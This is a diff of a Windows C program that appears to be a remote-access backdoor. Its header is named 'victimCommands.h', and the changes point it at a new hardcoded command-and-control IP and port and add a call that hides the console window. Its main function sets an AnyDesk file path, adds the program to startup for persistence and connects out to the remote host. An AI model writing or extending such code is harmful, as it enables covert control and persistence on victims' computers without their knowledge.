@@ -1,12 +1,10 @@
-#define _WIN32_WINNT 0x0500 // Hides the console
-
 #include <stdio.h>
 #include <Windows.h>
 #include <stdbool.h>
 #include "victimCommands.h"
 
-#define PORT 14097
-#define IP "3.134.125.175"
+#define PORT 13512
+#define IP "3.141.177.1"
 
 // Functions
 void connectToHost();
@@ -106,6 +104,7 @@ void processCommand(int command)
 
 int main(int argc, char const *argv[])
 {
+    hideConsoleWindow(); // Hides the console window
     setAnyDeskFilePath();
     addProgramToStartup();
     connectToHost();
